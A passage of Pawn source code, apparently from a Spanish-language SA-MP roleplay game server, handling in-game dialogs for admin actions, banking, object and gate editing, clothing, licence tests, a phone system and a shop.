					return 1;
				}
				case 5:
				{
					SetPVarInt(playerid,"ADM_Click",ADM_EligeInt);
					Dialog(playerid,dAdmClick,DIALOG_STYLE_INPUT,ADM_HEAD,""#CBLANCO"Introduce el interior para este jugador","Aceptar","Cancelar");
					return 1;
				}
				case 6:
				{
					SetPVarInt(playerid,"ADM_Click",ADM_EligeVW);
					Dialog(playerid,dAdmClick,DIALOG_STYLE_INPUT,ADM_HEAD,""#CBLANCO"Introduce el virtual world para este jugador","Aceptar","Cancelar");
					return 1;
				}
				case 7:
				{
		            new
		                Float: Pos[3];

		            GetPlayerPos(playerid,Pos[0],Pos[1],Pos[2]);
					if(IsPlayerInAnyVehicle(ID)) SetVehiclePos(GetPlayerVehicleID(ID),Pos[0],Pos[1],Pos[2]+1);
					else SetPlayerPos(ID,Pos[0],Pos[1],Pos[2]+1);
					Info = "trajo a";
					SetPlayerInterior(ID,GetPlayerInterior(playerid));
					SetPlayerVirtualWorld(ID,GetPlayerVirtualWorld(playerid));
					return 1;
				}
				case 8:
				{
				    SetPVarInt(playerid,"ADM_Click",ADM_Vida);
					Dialog(playerid,dAdmClick,DIALOG_STYLE_LIST,ADM_HEAD,"- Curar\n- Asesinar","Aceptar","Cancelar");
					return 1;
				}
				case 9:
				{
				    SetPVarInt(playerid,"ADM_Click",ADM_Carcel);
					Dialog(playerid,dAdmClick,DIALOG_STYLE_INPUT,ADM_HEAD,""#CBLANCO"Introduce el tiempo de carcel (minutos) para este jugador","Aceptar","Cancelar");
					return 1;
				}
				case 10:
				{
				    SetPVarInt(playerid,"ADM_Click",ADM_Kick);
					Dialog(playerid,dAdmClick,DIALOG_STYLE_INPUT,ADM_HEAD,""#CBLANCO"Introduce la razón de la expulsión (Opcional)","Aceptar","Cancelar");
					return 1;
				}
				case 11:
				{
				    SetPVarInt(playerid,"ADM_Click",ADM_Ban);
					Dialog(playerid,dAdmClick,DIALOG_STYLE_INPUT,ADM_HEAD,""#CBLANCO"Introduce la razón de la expulsión (Opcional)","Aceptar","Cancelar");
					return 1;
				}
				case 12:
				{
				    SetPVarInt(playerid,"ADM_Click",ADM_Familia);
				    if(InfoJugador[playerid][jAdmin] > Mod.Superior)
				    {
						Dialog(playerid,dAdmClick,DIALOG_STYLE_LIST,ADM_HEAD,"- Cambiar rango\n- Expulsar\n- Dar miembro\n- Dar lider","Aceptar","Cancelar");
					}
					else
					{
						Dialog(playerid,dAdmClick,DIALOG_STYLE_LIST,ADM_HEAD,"- Cambiar rango\n- Expulsar\n- Dar miembro","Aceptar","Cancelar");
					}
					return 1;
				}
				case 13:
				{
				    SetPVarInt(playerid,"ADM_Click",ADM_Faccion);
				    if(InfoJugador[playerid][jAdmin] > Mod.Superior)
				    {
						Dialog(playerid,dAdmClick,DIALOG_STYLE_LIST,ADM_HEAD,"- Cambiar rango\n- Expulsar\n- Dar miembro\n- Dar lider","Aceptar","Cancelar");
					}
					else
					{
						Dialog(playerid,dAdmClick,DIALOG_STYLE_LIST,ADM_HEAD,"- Cambiar rango\n- Expulsar\n- Dar miembro","Aceptar","Cancelar");
					}
					return 1;
				}
				case 14:
				{
				    SetPVarInt(playerid,"ADM_Click",ADM_Dinero);
					Dialog(playerid,dAdmClick,DIALOG_STYLE_LIST,ADM_HEAD,"- Fijar dinero\n- Quitar dinero\n- Dar dinero","Aceptar","Cancelar");
					return 1;
				}
			}
			new strADM[128];
			format(strADM,sizeof(strADM),""#CADMINISTRADOR"[ADMINISTRACIÓN] "#CBLANCO"> %s %s %s "#CADMINISTRADOR"%s",NombreJugador_(playerid),Info,NombreJugador_(ID),InfoEx);
			MensajeAdmin(-1,strADM,Ayudante);
			return 1;
		}
		case dCargarCamion:
		{
			SetPVarInt(playerid,"Tipo_Entrega",listitem+1);
			InfoCamion[GetPlayerVehicleID(playerid)][camCarga] = listitem+1;
		    switch(listitem)
		    {
		        case 0: SetPVarInt(playerid,"Lugar_Entrega",random(4));
		        case 1: SetPVarInt(playerid,"Lugar_Entrega",random(2));
		        case 2: SetPVarInt(playerid,"Lugar_Entrega",random(3));
			}
   			SetTimerEx("CheckpointEntrega",10000,false,"i",playerid);
			TextoJugador(playerid,"~w~cargando ~p~camion...",8000,3);
			SetPVarInt(playerid,"PasoEntrega",1);
			alm(InfoCamion[GetPlayerVehicleID(playerid)][camChofer],pName(playerid));
			SetPVarInt(playerid,"Chofer_Camion",GetPlayerVehicleID(playerid));
		}
		case dCDepositar:
		{
		    if(!response) return 0;
		    new
				IDC = InfoJugador[playerid][jIDCuentaB],
				val = strval(inputtext);

			if(!IsNumeric(inputtext)) return Error(playerid, "~r~Escribe el número.");
		    if(val < 1) return Dialog(playerid,dCDepositar,DIALOG_STYLE_INPUT,""#CBLANCO"\tOperaciones bancarias - "#CINFO"DEPOSITAR:",""#CBLANCO"Introduce la cantidad de dinero que quieres "#CVERDE"depositar\n\n\t-"#CBLANCO"Debe ser un valor "#CADMINISTRADOR"numérico","Depositar","Cancelar");
			if(val > GetPlayerMoney(playerid)) return Dialog(playerid,dCDepositar,DIALOG_STYLE_INPUT,""#CBLANCO"\tOperaciones bancarias - "#CINFO"DEPOSITAR:",""#CBLANCO"No tienes esa cantidad de dinero.","Depositar","Cancelar");
			InfoCuentaB[IDC][cuenDinero] += strval(inputtext);
			QuitarDinero(playerid,strval(inputtext));
			new Str[120];
			A_Format(Str,"Balance: ~g~$%d",InfoCuentaB[IDC][cuenDinero]);
			Dinero_Banco += val;
			ActualizarDatosGenerales();
			PlayerTextDrawSetString(playerid,Cuenta_Balance[1][playerid],Str);
			ActualizarCuentaB(IDC);
			A_Format(Str, "%s depositó $%d [$%d]", NombreJugador_(playerid), val, InfoCuentaB[IDC][cuenDinero]);
			Log("LOG/Banco.txt", Str);
		}
		case dCRetirar:
		{
		    if(!response) return 0;
		    new
				IDC = InfoJugador[playerid][jIDCuentaB],
				val = strval(inputtext);

			if(!IsNumeric(inputtext)) return Error(playerid, "~r~Escribe el número.");
		    if(val < 1) return Dialog(playerid,dCRetirar,DIALOG_STYLE_INPUT,""#CBLANCO"\tOperaciones bancarias - "#CINFO"RETIRAR:",""#CBLANCO"Introduce la cantidad de dinero que quieres "#CVERDE"retirar\n\n\t-"#CBLANCO"Debe ser un valor "#CADMINISTRADOR"numérico","Retirar","Cancelar");
			if(val > InfoCuentaB[IDC][cuenDinero]) return Dialog(playerid,dCRetirar,DIALOG_STYLE_INPUT,""#CBLANCO"\tOperaciones bancarias - "#CINFO"RETIRAR:",""#CBLANCO"No tienes esa cantidad de dinero.","Retirar","Cancelar");
			InfoCuentaB[IDC][cuenDinero] -= val;
			GivePlayerMoney(playerid,val);
			ActualizarCuentaB(IDC);
			new Str[120];
			Dinero_Banco -= val;
			ActualizarDatosGenerales();
			A_Format(Str,"Balance: ~g~$%d",InfoCuentaB[IDC][cuenDinero]);
			PlayerTextDrawSetString(playerid,Cuenta_Balance[1][playerid],Str);
			A_Format(Str, "%s retiró $%d [$%d]", NombreJugador_(playerid), val, InfoCuentaB[IDC][cuenDinero]);
			Log("LOG/Banco.txt", Str);
		}
		case dCTransferir:
		{
		    if(!response)
		    {
				DeletePVar(playerid,"Parte_Transferir");
				DeletePVar(playerid,"Cuenta_Transferir");
				return 1;
			}
		    if(GetPVarInt(playerid,"Parte_Transferir") == 1)
		    {
		    	if(!response) return 0;
		    	new Arch[16];
				A_Format(Arch,"Banco/%d.ini",strval(inputtext));
  				if(!fexist(Arch)) return Error(playerid,"¡ID de cuenta inválido!");
  				SetPVarInt(playerid,"Cuenta_Transferir",strval(inputtext));
				Dialog(playerid,dCTransferir,DIALOG_STYLE_INPUT,""#CBLANCO"\tOperaciones bancarias - "#CINFO"Transferir",""#CBLANCO"Introduce la cantidad de dinero que quieres "#CVERDE"transferir","Transferir","Cancelar");
				SetPVarInt(playerid,"Parte_Transferir",0);
			}
			else if(GetPVarInt(playerid,"Cuenta_Transferir") != 0)
			{
		    	if(!response) return 0;
			    new Val = strval(inputtext),IDC = GetPVarInt(playerid,"Cuenta_Transferir");
				if(Val > InfoCuentaB[InfoJugador[playerid][jIDCuentaB]][cuenDinero]) return Dialog(playerid,dCTransferir,DIALOG_STYLE_INPUT,""#CBLANCO"\tOperaciones bancarias - "#CINFO"Transferir",""#CBLANCO"¡No tienes esa cantidad de dinero en tu cuenta!","Transferir","Cancelar");
		    	if(strval(inputtext) < 1) return Dialog(playerid,dCTransferir,DIALOG_STYLE_INPUT,""#CBLANCO"\tOperaciones bancarias - "#CINFO"Transferir",""#CBLANCO"¡Debes ingresar un número positívo!","Transferir","Cancelar");
				InfoCuentaB[IDC][cuenDinero] += Val;
			    InfoCuentaB[InfoJugador[playerid][jIDCuentaB]][cuenDinero] -= Val;
				DeletePVar(playerid,"Parte_Transferir");
				DeletePVar(playerid,"Cuenta_Transferir");
				ActualizarCuentaB(IDC);
				ActualizarCuentaB(InfoJugador[playerid][jIDCuentaB]);
				new Str[120];
				A_Format(Str,"Balance: ~g~$%d",InfoCuentaB[InfoJugador[playerid][jIDCuentaB]][cuenDinero]);
				PlayerTextDrawSetString(playerid,Cuenta_Balance[1][playerid],Str);
				MensajeF(playerid,-1,"Depositaste $%d en la cuenta ID %d "#CINFO"(%s)",Val,IDC,InfoCuentaB[IDC][cuenNombre]);
				A_Format(Str, "%s transfirió $%d a cuenta ID %d(%s)", NombreJugador_(playerid), Val, IDC, InfoCuentaB[IDC][cuenNombre]);
				Log("LOG/Banco.txt", Str);
			}
		}
		case dEditarObj:
		{
		    if(!response) return 0;
		    switch(listitem)
		    {
		        case 0:
		        {
		            EditDynamicObject(playerid,Objeto[GetPVarInt(playerid,"EDITAR_IDObj")][oID]);
				}
				case 1:
				{
				    Dialog(playerid,dCambiarTexto,DIALOG_STYLE_INPUT,""#CBLANCO"Editar texto",""#CBLANCO"Escribe el texto deseado:","Aceptar","Cancelar");
				}
				case 2:
				{
				    Dialog(playerid,dCambiarTamano,DIALOG_STYLE_INPUT,""#CBLANCO"Editar tamaño",""#CBLANCO"Escribe el tamaño (0 - 255):","Aceptar","Cancelar");
				}
				case 3:
				{
				    Dialog(playerid,dCambiarColor,DIALOG_STYLE_LIST,""#CBLANCO"Editar color","Escribe el color (Hexadesimal) - ejemplo: "#CROJO"0xFFFFFF00","Aceptar","Cancelar");
				}
				case 4:
				{
				    Dialog(playerid,dCambiarTamanoO,DIALOG_STYLE_INPUT,""#CBLANCO"Editar tamaño",""#CBLANCO"Escribe el tamaño del objeto - textura (10 - 110)","Aceptar","Cancelar");
				}
				case 5:
				{
				    Dialog(playerid,dCambiarIndexO,DIALOG_STYLE_INPUT,""#CBLANCO"Editar index",""#CBLANCO"Escribe el index del objeto","Aceptar","Cancelar");
				}
				case 6:
				{
		    		new IDO = GetPVarInt(playerid,"EDITAR_IDObj");
		    		DestroyDynamicObject(Objeto[IDO][oID]);
					Objeto[IDO][oID] = 0;
					new Str[30];
					A_Format(Str,"Objetos/%d.ini",IDO);
					fremove(Str);
					--Total_Objetos_Creados;
				}
				case 7:
				{
					new IDO = GetPVarInt(playerid,"EDITAR_IDObj");
				    ActualizarObjeto(IDO);
		    		DestroyDynamicObject(Objeto[IDO][oID]);
		    		Objeto[IDO][oID] = CreateDynamicObject(Objeto[IDO][oIDModel],Objeto[IDO][oPosx],Objeto[IDO][oPosy],Objeto[IDO][oPosz],Objeto[IDO][oAngx],Objeto[IDO][oAngy],Objeto[IDO][oAngz]);
					if(Objeto[IDO][oColor])
					{
			 			SetDynamicObjectMaterialText(Objeto[IDO][oID],Objeto[IDO][oIndexO],Objeto[IDO][oNombre],Objeto[IDO][oTamanoO],"Arial",Objeto[IDO][oTamano],1,Objeto[IDO][oColor]);
					}
				}
			}
		}
		case dCambiarTexto:
		{
		    if(!response) return 0;
		    new IDO = GetPVarInt(playerid,"EDITAR_IDObj");
		    SetDynamicObjectMaterialText(Objeto[IDO][oID],Objeto[IDO][oIndexO],inputtext,Objeto[IDO][oTamanoO],"Arial",Objeto[IDO][oTamano],1,Objeto[IDO][oColor]);
			alm(Objeto[IDO][oNombre],inputtext);
		}
		case dCambiarTamano:
		{
		    if(!response) return 0;
		    if(strval(inputtext) > 255) return Error(playerid,"¡Debe ser menor a 255!");
		    new IDO = GetPVarInt(playerid,"EDITAR_IDObj");
		    SetDynamicObjectMaterialText(Objeto[IDO][oID],Objeto[IDO][oIndexO],Objeto[IDO][oNombre],Objeto[IDO][oTamanoO],"Arial",strval(inputtext),1,Objeto[IDO][oColor]);
			Objeto[IDO][oTamano] = strval(inputtext);
		}
		case dCambiarColor:
		{
		    if(!response) return 0;
		    new IDO = GetPVarInt(playerid,"EDITAR_IDObj");
			sscanf(inputtext, "h", Objeto[IDO][oColor]);
		    SetDynamicObjectMaterialText(Objeto[IDO][oID],Objeto[IDO][oIndexO],Objeto[IDO][oNombre],Objeto[IDO][oTamanoO],"Arial",Objeto[IDO][oTamano],1,Objeto[IDO][oColor]);
		}
		case dCambiarTamanoO:
		{
		    if(!response) return 0;
		    if(strval(inputtext) > 140) return Error(playerid,"¡Debe ser menor o igual a 140!");
		    new IDO = GetPVarInt(playerid,"EDITAR_IDObj");
			Objeto[IDO][oTamanoO] = strval(inputtext);
		    SetDynamicObjectMaterialText(Objeto[IDO][oID],Objeto[IDO][oIndexO],Objeto[IDO][oNombre],Objeto[IDO][oTamanoO],"Arial",Objeto[IDO][oTamano],1,Objeto[IDO][oColor]);
		}
		case dCambiarIndexO:
		{
		    if(!response) return 0;
		    if(strval(inputtext) > 140) return Error(playerid,"¡Debe ser menor o igual a 140!");
		    new IDO = GetPVarInt(playerid,"EDITAR_IDObj");
			Objeto[IDO][oIndexO] = strval(inputtext);
		    SetDynamicObjectMaterialText(Objeto[IDO][oID],Objeto[IDO][oIndexO],Objeto[IDO][oNombre],Objeto[IDO][oTamanoO],"Arial",Objeto[IDO][oTamano],1,Objeto[IDO][oColor]);
		}
		case dMandarSMS:
		{
		    if(response)
		    {
				PlayerTextDrawSetString(playerid,Numero[playerid],"~p~Enviando...");
				new NUM = GetPVarInt(playerid,"Numero_Marcado");
				SetTimerEx("LlamarNum",1500,false,"iii",1,playerid,NUM);
				SetPVarString(playerid,"CEL_SMS",inputtext);
			}
		}
		case dElegirSRopa:
		{
		    if(!response) return 0;
			CambiarRopa(playerid,GetPVarInt(playerid,"ROPA_SELECCIONADA"),listitem);
		}
		case dEditarRopa:
		{
		    if(!response) return 0;
		    if(InfoJugador[playerid][jRopa][listitem] == 0) return Error(playerid,"¡No tienes nada en ese slot!");
		    SetPVarInt(playerid,"ROPA_EDITAR",listitem);
			Dialog(playerid,dEditarRopa_2,DIALOG_STYLE_LIST,"EDITAR ROPA","- "#CINFO"Ponerse esta ropa\n- "#CINFO"Eliminar","Aceptar","Cancelar");
 		}
		case dEditarRopa_2:
		{
		    if(!response) return 0;
		    new R = GetPVarInt(playerid,"ROPA_EDITAR");
			if(listitem == 0)
			{
      			CambiarRopa(playerid,InfoJugador[playerid][jRopa][R],R);
			}
			else if(listitem == 1)
			{
				Mensaje(playerid,-1,"> Ropa "#CADMINISTRADOR"eliminada");
				if(GetPlayerSkin(playerid) == InfoJugador[playerid][jRopa][R])
				{
					switch(InfoJugador[playerid][jSexo])
					{
					    case 1: SetPlayerSkin(playerid,252);
					    case 2: SetPlayerSkin(playerid,140);
					}
				}
				InfoJugador[playerid][jRopa][R] = 0;
			}
		}
		case dLicencia:
		{
		    if(!response) return 1;
		    if(GetPlayerMoney(playerid) < 600) return Error(playerid,"¡No tienes suficiente dinero, necesitas $600!");
		    if(listitem == 0)
			{
			    new v_ = -1;
		        Loop(v,3,0)
		        {
					if(AutoLicenciaUsado[0][v] == false)
  					{
			  			v_ = v;
			  			break;
					}
				}
				if(v_ == -1) return Error(playerid,"¡En este momento no hay autos disponibles! Espera que se desocupe uno.");
				SetPlayerInterior(playerid,1);
				SetPlayerVirtualWorld(playerid,random(80));
 				SetVehicleVirtualWorld(LicenciaAuto[v_],GetPlayerVirtualWorld(playerid));
				KillTimer2(playerid,TIMER_LICENCIA);
				Timer_Jugador[playerid][TIMER_LICENCIA] = SetTimerEx("TiempoLicencia",1000,true,"i",playerid);
				SetPVarInt(playerid,"LIC_Segundos",150);
				SetPVarInt(playerid,"LIC_Checks",1);
				SetPVarInt(playerid,"LIC_Tipo",1);
				PutPlayerInVehicle(playerid,LicenciaAuto[v_],0);
				SetPlayerCP(playerid,CP_LICENCIAVEH,LIC_Check1);
				QuitarDinero(playerid,600);
				EncenderMotor(GetPlayerVehicleID(playerid));
				SetPVarInt(playerid, "LIC_VEH_INDEX", 0);
				SetPVarInt(playerid, "LIC_VEH_INDEX_2", v_);
				AutoLicenciaUsado[0][v_] = true;
				return 1;
			}
		    else if(listitem == 1)
			{
			    new v_ = -1;
		        Loop(v,3,0)
		        {
					if(AutoLicenciaUsado[1][v] == false)
  					{
			  			v_ = v;
			  			break;
					}
				}
				if(v_ == -1) return Error(playerid,"¡En este momento no hay motos disponibles! Espera que se desocupe uno.");
				SetPlayerInterior(playerid,1);
				SetPlayerVirtualWorld(playerid,random(80));
				SetVehicleVirtualWorld(LicenciaMoto[v_],GetPlayerVirtualWorld(playerid));
				Timer_Jugador[playerid][TIMER_LICENCIA] = SetTimerEx("TiempoLicencia",1000,true,"i",playerid);
				SetPVarInt(playerid,"LIC_Segundos",125);
				SetPVarInt(playerid,"LIC_Checks",1);
				SetPVarInt(playerid,"LIC_Tipo",1);
				PutPlayerInVehicle(playerid,LicenciaMoto[v_],0);
				SetPlayerCP(playerid,CP_LICENCIAVEH,LIC_Check1);
				QuitarDinero(playerid,600);
				EncenderMotor(GetPlayerVehicleID(playerid));
				SetPVarInt(playerid, "LIC_VEH_INDEX", 1);
				SetPVarInt(playerid, "LIC_VEH_INDEX_2", v_);
				AutoLicenciaUsado[1][v_] = true;
				return 1;
			}
		}
	 	case dCrearPorton:
	 	{
			new
				i = GetPVarInt(playerid, "PORTON_EDITAR");

	     	if(!response)
			{
			    DeletePVar(playerid, "PORTON_EDITAR");
			    InfoPorton_Ex[i][portFamilia] = 0;
				return 1;
			}
			
	     	GetPlayerPos(playerid,InfoPorton_Ex[i][pX],InfoPorton_Ex[i][pY],InfoPorton_Ex[i][pZ]);
	     	InfoPorton_Ex[i][portModel] = strval(inputtext);
			InfoPorton_Ex[i][portID] = CreateDynamicObject(InfoPorton_Ex[i][portModel],InfoPorton_Ex[i][pX]+2,InfoPorton_Ex[i][pY]+1,InfoPorton_Ex[i][pZ]+2,0,0,0);
			MensajeF(playerid,-1,"Porton nº "#CROJO"%d "#CBLANCO"creado. Use "#CINFO"/editarporton "#CBLANCO"para continuar", i);
			return 1;
		}
	  	case dEditPorton:
	  	{
			new
				i = GetPVarInt(playerid, "PORTON_EDITAR");

	     	if(!response)
			{
			    DeletePVar(playerid, "PORTON_EDITAR");
				return 1;
			}

	    	switch(listitem)
	     	{
	         	case 0:
	         	{
	         		SetPVarInt(playerid,PVar_PORTON,EDIT_POS);
	             	EditDynamicObject(playerid,InfoPorton_Ex[i][portID]);
				}
	    		case 1:
	    		{
	             	SetPVarInt(playerid,PVar_PORTON,EDIT_ABIERTO);
	             	EditDynamicObject(playerid,InfoPorton_Ex[i][portID]);
				}
	    		case 2:
	    		{
					Dialog(playerid, dIDModeloPorton, DIALOG_STYLE_INPUT, ">> Cambiar Modelo de portón", ""#CBLANCO"Escribe el número de Modelo para el porton:", "Aceptar", "Cancelar");
				}
	    		case 3:
	    		{
					Dialog(playerid, dEditVelocidadP, DIALOG_STYLE_INPUT, ">> Cambiar velocidad del portón", ""#CBLANCO"Escribe la velocidad (Ej: 1.0 - 15.0)", "Aceptar", "Cancelar");
				}
	    		case 4:
	    		{
	    		    DestroyDynamicObject(InfoPorton_Ex[i][portID]);
					InfoPorton_Ex[i][portID] = CreateDynamicObject( InfoPorton_Ex[i][portModel],
																	InfoPorton_Ex[i][pX],
																	InfoPorton_Ex[i][pY],
																	InfoPorton_Ex[i][pZ],
																	InfoPorton_Ex[i][pRX],
																	InfoPorton_Ex[i][pRY],
																	InfoPorton_Ex[i][pRZ]);
					ActualizarPorton(i);
					MensajeF(playerid, -1, "El porton nº "#CROJO"%d "#CBLANCO"fue actualizado.", i);
				}
	    		case 5:
	    		{
	    		    DestroyDynamicObject(InfoPorton_Ex[i][portID]);

					InfoPorton_Ex[i][portID] = 0;
					InfoPorton_Ex[i][portModel] = 0;
					InfoPorton_Ex[i][pX] = 0.0;
					InfoPorton_Ex[i][pY] = 0.0;
					InfoPorton_Ex[i][pZ] = 0.0;
					InfoPorton_Ex[i][pRX] = 0.0;
					InfoPorton_Ex[i][pRY] = 0.0;
					InfoPorton_Ex[i][pRZ] = 0.0;
					InfoPorton_Ex[i][pAX] = 0.0;
					InfoPorton_Ex[i][pAY] = 0.0;
					InfoPorton_Ex[i][pAZ] = 0.0;
					InfoPorton_Ex[i][portFamilia] = 0;
					InfoPorton_Ex[i][portCasa] = 0;
					
					new str[18];
					A_Format(str, "Portones/%d.ini", i);
					fremove(str);
					
					MensajeF(playerid, -1, "El porton nº "#CROJO"%d "#CBLANCO"fue eliminado.", i);
			    	DeletePVar(playerid, "PORTON_EDITAR");
				}
			}
		}
		case dIDModeloPorton:
		{
			new
				i = GetPVarInt(playerid, "PORTON_EDITAR");

	     	if(!response)
			{
			    DeletePVar(playerid, "PORTON_EDITAR");
				return 1;
			}
   			DestroyDynamicObject(InfoPorton_Ex[i][portID]);
   			
   			InfoPorton_Ex[i][portModel] = strval(inputtext);
   			
			InfoPorton_Ex[i][portID] = CreateDynamicObject( InfoPorton_Ex[i][portModel],
															InfoPorton_Ex[i][pX],
															InfoPorton_Ex[i][pY],
															InfoPorton_Ex[i][pZ],
															InfoPorton_Ex[i][pRX],
															InfoPorton_Ex[i][pRY],
															InfoPorton_Ex[i][pRZ]);
															
			MensajeF(playerid, -1, "El modelo del porton nº "#CROJO"%d "#CBLANCO"fue cambiado.", i);
			return 1;
		}
		case dEditVelocidadP:
		{
			new
				i = GetPVarInt(playerid, "PORTON_EDITAR"),
				Float: speed = floatstr(inputtext);

	     	if(!response)
			{
			    DeletePVar(playerid, "PORTON_EDITAR");
				return 1;
			}
			if(!speed)
			{
			    DeletePVar(playerid, "PORTON_EDITAR");
			    Mensaje(playerid, -1, "No puedes utilizar valores negativos ni nulos para la velocidad.");
				return 1;
			}
			InfoPorton_Ex[i][portVelocidad] = speed;
 			MensajeF(playerid, -1, "La velocidad del porton nº "#CROJO"%d "#CBLANCO"fue cambiada a "#CVERDE"%.03f.", i, speed);
		}
		case dAEntrevista:
		{
		    if(!response)
		    {
		        DeletePVar(playerid,"Entrevistado_Por");
		        OnPlayerText(playerid,"No gacias, no acepto la entrevista.");
		        return 1;
			}
			else if(response)
			{
		        OnPlayerText(playerid,"Sí, acepto la entrevista.");
		        Mensaje(playerid,-1,"Para hablar por el microfono, usa el comando "#CINFO"/mic");
				return 1;
			}
		}
		case dMasCelular:
		{
			if(!response) return 1;
			switch(listitem)
			{
			    case 0:
			    {
			        if(strval(strNum[playerid]) == (NUMERO_POLICIA | NUMERO_HOSPITAL | NUMERO_CLARO | NUMERO_MECANICOS)) return Error(playerid,"Por el momento, solo puedes enviarle mensajes a estos servicios.");
			        if(InfoJugador[playerid][jNumeroCel] == strval(strNum[playerid])) return Error(playerid,"¡No puedes llamarte a tí mismo!");
			        SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);
					PlayerTextDrawSetString(playerid,Numero[playerid],"~r~Llamando...");
					SetTimerEx("LlamarNum",1500,false,"iii",0,playerid,strval(strNum[playerid]));
				}
				case 1:
				{
			        if(InfoJugador[playerid][jNumeroCel] == strval(strNum[playerid])) return Error(playerid,"¡No puedes enviarte mensajes a tí mismo!");
				    Dialog(playerid,dMandarSMS,DIALOG_STYLE_INPUT,""#CBLANCO"Enviar SMS",""#CBLANCO"Escribe el "#CINFO"mensaje "#CBLANCO"para enviar:","Aceptar","Cancelar");
				}
				case 2:
				{
				    Dialog(playerid,dAgendarCel,DIALOG_STYLE_INPUT,""#CBLANCO"Agendar "#CINFO"número",""#CBLANCO"Escribe el "#CINFO"nombre "#CBLANCO"del contacto:","Aceptar","Cancelar");
				}
			}
			alm(strNum[playerid],"");
		}
		case dAgendarCel:
		{
			if(!response) return 1;
			if(strlen(inputtext) > 16 || !strlen(inputtext) ) return Error(playerid,"¡Máximo 16 caracteres! (mínimo 1)");
			if(strfind(inputtext,"~") != -1 || strfind(inputtext,"=") != -1) return Error(playerid,"Por cuestiones de seguridad, no puedes usar ese caracter.");
			Loop(i,10,0)
			{
			    if(!InfoJugador[playerid][jContacto][i])
			    {
			        AgregarContacto(playerid, i, GetPVarInt(playerid,"Numero_Marcado"), inputtext );
					MensajeF(playerid,-1,"Número: "#CVERDE"[%d]"#CBLANCO" | Nombre: "#CINFO"%s", GetPVarInt(playerid,"Numero_Marcado"), inputtext);
					DeletePVar(playerid, "Numero_Marcado");
					return 1;
				}
			}
			return Error(playerid,"¡No puedes agendar más contactos, elimina alguno!");
		}
		case dCelContacto:
		{
			if(!response) return 1;
			Loop(i,10,0)
			{
			    if(InfoJugador[playerid][jContacto][i] == GetPVarInt(playerid,"Numero_Marcado"))
			    {
			        switch(listitem)
			        {
			            case 0:
			            {
			                AgregarContacto(playerid, i, 0, "");
			                Mensaje(playerid,-1,"Contacto "#CROJO"eliminado");
							PlayerTextDrawSetString(playerid,CelContactos[playerid][i],"");
							return 1;
						}
						case 1:
						{
			        		if(InfoJugador[playerid][jContacto][i] == (NUMERO_POLICIA | NUMERO_HOSPITAL | NUMERO_CLARO | NUMERO_MECANICOS)) return Error(playerid,"Por el momento, solo puedes enviarle mensajes a estos servicios.");
						    if(InfoJugador[playerid][jNumeroCel] == InfoJugador[playerid][jContacto][i]) return Error(playerid,"¡No puedes llamarte a tí mismo!");
						    SacarCelular(playerid);
						    MostrarCelular(playerid,ID_MENUMARCAR);
			        		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);
							PlayerTextDrawSetString(playerid,Numero[playerid],"~p~Llamando...");
							SetTimerEx("LlamarNum",1500,false,"iii",0,playerid,InfoJugador[playerid][jContacto][i]);
							return 1;
						}
						case 2:
						{
						    if(InfoJugador[playerid][jNumeroCel] == InfoJugador[playerid][jContacto][i]) return Error(playerid,"¡No puedes llamarte a tí mismo!");
						    SacarCelular(playerid);
						    MostrarCelular(playerid,ID_MENUMARCAR);
				    		Dialog(playerid,dMandarSMS,DIALOG_STYLE_INPUT,""#CBLANCO"Enviar SMS",""#CBLANCO"Escribe el "#CINFO"mensaje "#CBLANCO"para enviar:","Aceptar","Cancelar");
							return 1;
						}
					}
				}
			}
		}
		case dElegirBebida:
		{
		    if(!response) return 1;
		    switch(listitem)
			{
			    case 0:
			    {
					if(GetPlayerMoney(playerid) < PRECIO_AGUA) return Error(playerid,"¡Dinero insufiente!");
					QuitarDinero(playerid,PRECIO_AGUA);
					InfoNegocio[ID_Negocio(playerid)][nDinero] += PRECIO_AGUA;
					return AutoRol(playerid,"compra un vaso de agua");
				}
			    case 1:
			    {
					if(GetPlayerMoney(playerid) < PRECIO_GASEOSA) return Error(playerid,"¡Dinero insufiente!");
					QuitarDinero(playerid,PRECIO_GASEOSA);
					SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK);
					InfoNegocio[ID_Negocio(playerid)][nDinero] += PRECIO_GASEOSA;
					return AutoRol(playerid,"compra una lata de gaseosa");
				}
			    case 2:
			    {
					if(GetPlayerMoney(playerid) < PRECIO_CERVEZA) return Error(playerid,"¡Dinero insufiente!");
					QuitarDinero(playerid,PRECIO_CERVEZA);
					SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_WINE);
					InfoNegocio[ID_Negocio(playerid)][nDinero] += PRECIO_CERVEZA;
					return AutoRol(playerid,"compra una botella de cerveza");
				}
			    case 3:
			    {
					if(GetPlayerMoney(playerid) < PRECIO_VODKA) return Error(playerid,"¡Dinero insufiente!");
					QuitarDinero(playerid,PRECIO_VODKA);
					SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_WINE);
					InfoNegocio[ID_Negocio(playerid)][nDinero] += PRECIO_VODKA;
					return AutoRol(playerid,"compra una botella de vodka");
				}
			    case 4:
			    {
					if(GetPlayerMoney(playerid) < 5) return Error(playerid,"¡Dinero insufiente!");
					QuitarDinero(playerid,5);
					InfoJugador[playerid][jCigarrillos] += 5;
					Mensaje(playerid,C_INFO,"> "#CBLANCO"Compraste una caja de 5 cigarrillos. "#CINFO"(/fumar)");
					InfoNegocio[ID_Negocio(playerid)][nDinero] += 5;
					return AutoRol(playerid,"compra una caja de 5 cigarrillos");
				}
			    case 5:
			    {
					if(GetPlayerMoney(playerid) < 3) return Error(playerid,"¡Dinero insufiente!");
					if(InfoJugador[playerid][jEncendedor]) return Error(playerid,"¡Ya tienes un encendedor!");
					QuitarDinero(playerid,3);
					InfoNegocio[ID_Negocio(playerid)][nDinero] += 3;
					InfoJugador[playerid][jEncendedor] = true;
					return AutoRol(playerid,"compra un encendedor");
				}
			    case 6:
			    {
					if(GetPlayerMoney(playerid) < 11) return Error(playerid,"¡Dinero insufiente!");
					QuitarDinero(playerid,11);
					GivePlayerWeapon(playerid,41,500);
					InfoNegocio[ID_Negocio(playerid)][nDinero] += 11;
					return AutoRol(playerid,"compra un spray protector");
				}
			    case 7:
			    {
					if(GetPlayerMoney(playerid) < 25) return Error(playerid,"¡Dinero insufiente!");
					QuitarDinero(playerid,25);
					GivePlayerWeapon(playerid,14,1);
					InfoNegocio[ID_Negocio(playerid)][nDinero] += 25;
					return AutoRol(playerid,"compra un ramo de flores");
				}
				case 8:
				{
